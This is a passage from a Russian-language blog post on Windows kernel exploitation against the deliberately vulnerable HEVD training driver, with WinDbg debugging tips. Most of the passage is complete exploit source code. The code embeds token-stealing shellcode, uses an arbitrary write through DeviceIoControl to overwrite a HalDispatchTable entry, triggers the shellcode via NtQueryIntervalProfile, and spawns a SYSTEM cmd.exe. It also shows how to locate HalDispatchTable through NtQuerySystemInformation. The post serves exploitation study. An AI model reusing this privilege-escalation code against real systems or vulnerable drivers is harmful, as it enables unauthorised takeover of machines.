                    <span class="c1">//printf("%d", sizeof(poc));</span>
                    <span class="n">DWORD</span> <span class="n">bytesRetn</span><span class="p">;</span>

                    <span class="n">LPVOID</span> <span class="o">*</span><span class="n">var1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellc_ptr</span><span class="p">;</span>

                    <span class="n">poc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">2</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">3</span><span class="p">];</span>

                    <span class="n">poc</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">0</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">1</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">2</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">3</span><span class="p">];</span>

                    <span class="c1">//memcpy((void *) &amp;poc[0], HalDispatchTable, 0x4);</span>
                    <span class="c1">//memcpy((void *) &amp;poc[4], &amp;shellc_ptr, 0x4);</span>

                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Starting interaction with the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IO_CODE</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">poc</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesRetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

                    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>

                    <span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">);</span>
                    <span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">PtrNtQueryIntervalProfile</span><span class="p">)(</span>
                        <span class="n">DWORD</span> <span class="n">ProfileSource</span><span class="p">,</span>
                        <span class="n">PULONG</span> <span class="n">Interval</span>
                        <span class="p">);</span>
                    <span class="n">PtrNtQueryIntervalProfile</span> <span class="n">_NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">PtrNtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Address of NtQueryIntervalProfile: 0x%x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">);</span>
                    <span class="n">ULONG</span> <span class="n">whatever</span><span class="p">;</span>
                    <span class="n">_NtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">whatever</span><span class="p">);</span>

                    <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="c1">//printf("Skipped!\n");</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"EnumDeviceDrivers failed; array size needed is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LPVOID</span><span class="p">));</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>В самом конце у нас задача вызвать NtQueryIntervalProfile, что и происходит</p>

<p>Если дебагать, можно поставить бряки на NtQueryIntervalProfile и nt!KeQueryIntervalProfile</p>

<p><img src="/assets/post_images/4.png" alt="Result" /></p>

<p><a href="https://connormcgarr.github.io/Kernel-Exploitation-2/">Статья</a></p>

<h4 id="заметки"><a href="#header-4"></a>Заметки:</h4>

<ul>
  <li>Билдил в студии на хосте, в дебаг моде эксплойт работает только под windbg, в релизной версии работает без дебаггера, думаю, из-за vs либ</li>
  <li>Не забывать osr loader’ом загружать драйвер, если при первой загрузке не поставил automatic</li>
  <li>В теории можно сохранять значение по адресу HalDispatchTable+0x4 и после получения шелла восстанавливать его обратно, чтобы винда не падала (это проиходит при ребуте, так что не важно), но мне лень :)</li>
</ul>

<h3 id="заметкиследующий-способ-найти-haldispatchtable"><a href="#header-3"></a>Заметки:Следующий способ найти HalDispatchTable</h3>

<p>Воспользуемся NtQuerySystemInformation</p>

<p>Фишка для windbg по пути: вот мы собираем какой-то юзермодный файлик, который будет к драйверу обращаться (например наш де код) и нам бы надо пересобрать .cpp и в том числе .pdb, но дескриптор на .pdb открыт, мы его подгрузили в windbg. Можно выгрузить модули с помощью .reload /u перекомпилить код и  загрузить снова .sympath+ C:\path\to\pdb\file; .reload</p>

<p>Если хотим глядеть сорцы в windbg, надо сначала прожать File –&gt; Open Source File, когда стоплнулся код на брейлпоинте в проге, а уже потом прописать .reload и всё будет работать:</p>

<p>Нет активной отладки в сорцах, но в дизасме прога стопнулась:</p>

<p><img src="/assets/post_images/5.png" alt="debug" /></p>

<p>.reload и подключилась активная отладка:</p>

<p><img src="/assets/post_images/6.png" alt="debug1" /></p>

<p><img src="/assets/post_images/7.png" alt="debug2" /></p>

<p>И так, к NtQuerySystemInformation</p>

<p>Код получился вот такой:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tchar.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cp">#define MAXIMUM_FILENAME_LENGTH 255 
</span>
<span class="cp">#define IO_CODE 0x22200B
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">kDevName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">__debugbreak</span><span class="p">();</span>

    <span class="k">typedef</span> <span class="k">struct</span> <span class="nc">SYSTEM_MODULE</span> <span class="p">{</span>
        <span class="n">ULONG</span> <span class="n">Reserved1</span><span class="p">;</span>
        <span class="n">ULONG</span> <span class="n">Reserved2</span><span class="p">;</span>
        <span class="n">PVOID</span> <span class="n">ImageBaseAddress</span><span class="p">;</span>
        <span class="n">ULONG</span> <span class="n">ImageSize</span><span class="p">;</span>
        <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
        <span class="n">WORD</span> <span class="n">Id</span><span class="p">;</span>
        <span class="n">WORD</span> <span class="n">Rank</span><span class="p">;</span>
        <span class="n">WORD</span> <span class="n">w018</span><span class="p">;</span>
        <span class="n">WORD</span> <span class="n">NameOffset</span><span class="p">;</span>
        <span class="n">BYTE</span> <span class="n">Name</span><span class="p">[</span><span class="n">MAXIMUM_FILENAME_LENGTH</span><span class="p">];</span>
    <span class="p">}</span><span class="n">SYSTEM_MODULE</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSYSTEM_MODULE</span><span class="p">;</span>

    <span class="k">typedef</span> <span class="k">struct</span> <span class="nc">SYSTEM_MODULE_INFORMATION</span> <span class="p">{</span>
        <span class="n">ULONG</span> <span class="n">ModulesCount</span><span class="p">;</span>
        <span class="n">SYSTEM_MODULE</span> <span class="n">Modules</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>

    <span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SYSTEM_INFORMATION_CLASS</span> <span class="p">{</span>
        <span class="n">SystemModuleInformation</span> <span class="o">=</span> <span class="mi">11</span><span class="p">,</span>
        <span class="n">SystemHandleInformation</span> <span class="o">=</span> <span class="mi">16</span>
    <span class="p">}</span> <span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">;</span>

    <span class="n">ULONG</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">pModuleInfo</span><span class="p">;</span>

    <span class="n">NTSTATUS</span> <span class="n">WINAPI</span> <span class="nf">NtQuerySystemInformation</span><span class="p">(</span>
        <span class="n">_In_</span> <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
        <span class="n">_Inout_</span> <span class="n">PVOID</span> <span class="n">SystemInformation</span><span class="p">,</span>
        <span class="n">_In_</span> <span class="n">ULONG</span> <span class="n">SystemInformationLength</span><span class="p">,</span>
        <span class="n">_Out_opt_</span> <span class="n">PULONG</span> <span class="n">ReturnLength</span>
    <span class="p">);</span>

    <span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">PNtQuerySystemInformation</span><span class="p">)(</span>
        <span class="n">__in</span> <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
        <span class="n">__inout</span> <span class="n">PVOID</span> <span class="n">SystemInformation</span><span class="p">,</span>
        <span class="n">__in</span> <span class="n">ULONG</span> <span class="n">SystemInformationLength</span><span class="p">,</span>
        <span class="n">__out_opt</span> <span class="n">PULONG</span> <span class="n">ReturnLength</span>
        <span class="p">);</span>

    <span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">L"ntdll"</span><span class="p">);</span>
    <span class="n">PNtQuerySystemInformation</span> <span class="n">query</span> <span class="o">=</span> <span class="p">(</span><span class="n">PNtQuerySystemInformation</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQuerySystemInformation"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">query</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">wprintf</span><span class="p">(</span><span class="s">L"[!] GetModuleHandle Failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">query</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>

    <span class="n">pModuleInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">)</span><span class="n">GlobalAlloc</span><span class="p">(</span><span class="n">GMEM_ZEROINIT</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pModuleInfo</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">wprintf</span><span class="p">(</span><span class="s">L"[!] Failed to allocate memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">query</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">pModuleInfo</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">len</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">wprintf</span><span class="p">(</span><span class="s">L"[!] Failed to retrieve system module information</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PVOID</span> <span class="n">kernelImageBase</span> <span class="o">=</span> <span class="n">pModuleInfo</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBaseAddress</span><span class="p">;</span>
    <span class="n">PCHAR</span> <span class="n">kernelImage</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">pModuleInfo</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">Name</span><span class="p">;</span>

    <span class="n">kernelImage</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">kernelImage</span><span class="p">,</span> <span class="sc">'\\'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">wprintf</span><span class="p">(</span><span class="s">L"[+] Kernel Image name %S</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernelImage</span><span class="p">);</span>
    <span class="n">wprintf</span><span class="p">(</span><span class="s">L"[+] Kernel Image Base %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernelImageBase</span><span class="p">);</span>

    <span class="n">HMODULE</span> <span class="n">KernelHandle</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">kernelImage</span><span class="p">);</span>
    <span class="n">wprintf</span><span class="p">(</span><span class="s">L"[+] Kernel Handle %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">KernelHandle</span><span class="p">);</span>

    <span class="n">PVOID</span> <span class="n">HALUserLand</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">KernelHandle</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
    <span class="n">wprintf</span><span class="p">(</span><span class="s">L"[+] HalDispatchTable userland %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HALUserLand</span><span class="p">);</span>

    <span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">kernelImageBase</span> <span class="o">-</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">KernelHandle</span> <span class="o">+</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">HALUserLand</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>

    <span class="n">wprintf</span><span class="p">(</span><span class="s">L"[~] HalDispatchTable Kernel %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>




    <span class="n">printf</span><span class="p">(</span><span class="s">"[~] HalDispatchTable Kernel: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x83\xc4\x24\x5d\xc2\x08\x00</span><span class="s">"</span><span class="p">;</span>
    <span class="n">LPVOID</span> <span class="n">shellc_ptr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">shellc_ptr</span><span class="p">)</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">shellc_ptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="mi">65</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling CreateFileA() to obtain a handle to driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">kDevName</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
                    
    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error - dailed to get file handle!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Successfully obtained a handle to the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">poc</span><span class="p">[</span><span class="mi">113</span><span class="p">]</span> <span class="o">=</span> <span class="s">"AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp"</span><span class="p">;</span>

    <span class="n">DWORD</span> <span class="n">bytesRetn</span><span class="p">;</span>

    <span class="n">LPVOID</span> <span class="o">*</span><span class="n">var1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellc_ptr</span><span class="p">;</span>

    <span class="n">poc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">poc</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">poc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">2</span><span class="p">];</span>
    <span class="n">poc</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">3</span><span class="p">];</span>

    <span class="n">poc</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">poc</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">poc</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">2</span><span class="p">];</span>
    <span class="n">poc</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">3</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Starting interaction with the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IO_CODE</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">poc</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesRetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>

    <span class="c1">//HMODULE ntdll = GetModuleHandleA("ntdll");</span>
    <span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">PtrNtQueryIntervalProfile</span><span class="p">)(</span><span class="n">DWORD</span> <span class="n">ProfileSource</span><span class="p">,</span> <span class="n">PULONG</span> <span class="n">Interval</span><span class="p">);</span>
    
    <span class="n">PtrNtQueryIntervalProfile</span> <span class="n">_NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">PtrNtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Address of NtQueryIntervalProfile: 0x%x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">);</span>
    <span class="n">ULONG</span> <span class="n">whatever</span><span class="p">;</span>
    <span class="n">_NtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">whatever</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><a href="https://osandamalith.com/2017/06/14/windows-kernel-exploitation-arbitrary-overwrite/">Статья</a></p>

<p><a href="https://github.com/OsandaMalith/Exploits/blob/master/HEVD/FindHalDispatchTable.cpp">Сорцы</a></p>

</article>
      </section>
    </div>
  </div>
</body>

</html>
